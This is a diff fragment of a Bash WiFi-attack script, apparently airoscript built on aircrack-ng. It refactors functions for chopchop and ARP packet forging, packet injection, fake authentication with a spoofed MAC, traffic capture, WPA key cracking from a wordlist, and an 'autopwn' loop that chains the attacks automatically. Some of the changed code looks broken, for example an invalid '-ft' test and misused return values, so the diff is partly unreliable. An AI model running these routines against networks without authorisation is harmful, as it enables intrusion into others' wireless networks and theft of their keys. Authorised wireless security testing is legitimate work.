-		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Sending chopchop to:'` $Host_SSID" $EXECFLAG $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $IWIFI & menufonction
+		$ARPFORGE -0 -a $Host_MAC -h $1 -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
+		execute "ChopChop End" $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $1 -x $INJECTRATE $IWIFI & menufonction
 		fi
 	}
 
 	function capture {
-		rm -rf $DUMP_PATH/$Host_MAC*
-		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Capturing data on channel'`: $Host_CHAN" $TOPLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DUMPING_COLOR" $EXECFLAG $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
+		hardclean 
+		execute "Capturing" $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
 	}
 
 	function fakeauth {
-		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'` $Host_SSID " $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI
+	    execute "Fake auth on $Host_SSID" $AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI
 	}
 
 	function menufonction {
-		$TERMINAL $HOLD $TOPRIGHT $TITLEFLAG "`gettext 'Fake function to jump to menu'`" $EXECFLAG echo "Aircrack-ng is a great tool, Mister_X ASPj & HIRTE are GODS"
+		execute "Fake function to jump to menu" echo "Aircrack-ng is a great tool, Mister_X ASPj & HIRTE are GODS"
 	}
 
 	function Host_ssidinput {
-		echo "#######################################"
+		echo "---------------------------------------"
 		echo -e "`gettext \"###       Please enter SSID         ###\"`"
 		read Host_SSID
 		$clear
@@ -898,12 +846,14 @@ function configure {
 }
 
 function wpaconfigure {
-		$AIRCRACKOLD $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST &> $DUMP_PATH/$Host_MAC.key
+		$AIRCRACK $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST &> $DUMP_PATH/$Host_MAC.key
 		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
 }
 
 function doauto {
+    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0
         # Select target:
+        choosescan
         choosetype
 		if [ -e $DUMP_PATH/dump-01.csv ]; then
 			Parseforap && $clear
@@ -920,31 +870,36 @@ function autopwn(){
 
     for i in $attack_functions; do
         $i & cleanp &
-        while [ "1" ]; do [[ "$F" == "1" ]] && break
-            sleep $autopwn_min_sleep; [[ check_if_worked ]] && auto; return
+        while [ "1" ]; do 
+            if [ "$F" == "1" ]; then break; fi
+            sleep $autopwn_min_sleep; 
+            if [ "`check_if_worked`" == 1 ]; then auto; F=1; fi
+            return
         done
-        [[ check_if_worked ]] && auto; return
+        [[ `check_if_worked` == 1 ]] && auto
+        return
     done
 
     export AUTO=0; export QUIET=0; export INTERACTIVE=1 
 
 }
 
-function cleanp(){ $F=1; sleep $autopwn_sleep && clean_processes; }  # TODO Check this
+function cleanp(){ F=1; sleep $autopwn_sleep && clean_processes; }
+
 function check_all_ivs(){
-    # FIXME check if sufficent ivs in $Host_MAC*.cap, might be convert them to ivs and merge them.
-    echo
+    for i in $DUMP_PATH/$Host_MAC*.cap; do
+       maxn=$(( $maxn + `ivstools --convert $i|awk '/IVs/ {print $2}'` )); 
+    done
+    return $maxn
 }
 
 function check_if_worked(){
-    min_ivs=` $AIROSCWORDLIST -m $Host_MAC $Host_SSID`
-    for ivs in `check_all_ivs`; do 
-        if [ "$ivs" -gt "$min_ivs" ]; then return 1 ;fi
-    done
+    min_ivs=`$AIROSCWORDLIST -m $Host_MAC $Host_SSID`
+    if [ `check_all_ivs` -ft "$min_ivs" ]; then return 1; fi
     return 0
 }
 
-checkforcemac() {
+function checkforcemac() {
     if [ $FORCE_MAC_ADDRESS -eq 1 ]; then $clear && echo "Warn: Not checking mac" && menu
     else
     	mac=`$MACCHANGER -s wlan0|awk {'print $3'}`
